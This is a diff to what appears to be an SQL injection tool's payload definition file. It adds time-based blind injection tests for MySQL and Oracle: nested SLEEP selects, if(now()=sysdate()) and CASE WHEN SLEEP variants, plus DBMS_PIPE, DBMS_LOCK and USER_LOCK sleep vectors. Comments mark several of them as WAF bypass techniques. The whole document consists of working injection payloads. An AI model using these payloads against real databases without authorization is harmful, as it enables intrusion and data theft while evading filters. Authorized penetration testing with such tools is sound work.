@@ -414,6 +414,69 @@
         </details>
     </test>
 
+    <!-- Ghauri technique: (SELECT(0)FROM(SELECT(SLEEP(N)))v) - useful for string context/WAF bypass -->
+    <test>
+        <title>MySQL &gt;= 5.0.12 time-based blind - Ghauri style (query SLEEP - Pre-WHERE/string context)</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))v)</vector>
+        <request>
+            <payload>(SELECT(0)FROM(SELECT(SLEEP([SLEEPTIME])))v)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <!-- Ghauri technique: if(now()=sysdate(),sleep(N),0) - alternate when IF/SLEEP patterns filtered -->
+    <test>
+        <title>MySQL &gt;= 5.0.12 time-based blind - Ghauri style (if now sysdate SLEEP)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>if([INFERENCE],sleep([SLEEPTIME]),0)</vector>
+        <request>
+            <payload>if(now()=sysdate(),SLEEP([SLEEPTIME]),0)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <!-- Ghauri technique: (SELECT CASE WHEN... THEN SLEEP(N) ELSE 0 END) - CASE variant for WAF bypass -->
+    <test>
+        <title>MySQL &gt;= 5.0.12 time-based blind - Ghauri style (CASE WHEN SLEEP)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>(SELECT CASE WHEN([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE 0 END)</vector>
+        <request>
+            <payload>(SELECT CASE WHEN(1=1) THEN SLEEP([SLEEPTIME]) ELSE 0 END)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
     <test>
         <title>MySQL AND time-based blind (ELT)</title>
         <stype>5</stype>
@@ -855,9 +918,66 @@
     </test>
 
     <test>
-        <title>Oracle AND time-based blind (heavy query)</title>
+        <title>Oracle time-based blind - Ghauri style (DBMS_PIPE.RECEIVE_MESSAGE - string context)</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE NULL END)</vector>
+        <request>
+            <payload>DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle time-based blind - Ghauri style (DBMS_LOCK.SLEEP - string context)</title>
         <stype>5</stype>
         <level>2</level>
+        <risk>1</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>(CASE WHEN ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]) ELSE DBMS_LOCK.SLEEP(0) END)</vector>
+        <request>
+            <payload>DBMS_LOCK.SLEEP([SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle time-based blind - Ghauri style (USER_LOCK.SLEEP - string context)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>(CASE WHEN ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]) ELSE USER_LOCK.SLEEP(0) END)</vector>
+        <request>
+            <payload>USER_LOCK.SLEEP([SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>3</level>
         <risk>2</risk>
         <clause>1,2,3,9</clause>
         <where>1</where>
@@ -876,7 +996,7 @@
     <test>
         <title>Oracle OR time-based blind (heavy query)</title>
         <stype>5</stype>
-        <level>2</level>
+        <level>3</level>
         <risk>3</risk>
         <clause>1,2,3,9</clause>
         <where>1</where>
@@ -1805,6 +1925,26 @@
         <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL)</vector>
         <request>
             <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <!-- Ghauri technique: USER_LOCK.SLEEP alternative for Oracle (useful when DBMS_LOCK not available) -->
+    <test>
+        <title>Oracle time-based blind - Parameter replace (USER_LOCK.SLEEP)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,3,9</clause>
+        <where>3</where>
+        <vector>BEGIN IF ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]); ELSE USER_LOCK.SLEEP(0); END IF; END;</vector>
+        <request>
+            <payload>BEGIN IF ([RANDNUM]=[RANDNUM]) THEN USER_LOCK.SLEEP([SLEEPTIME]); ELSE USER_LOCK.SLEEP(0); END IF; END;</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
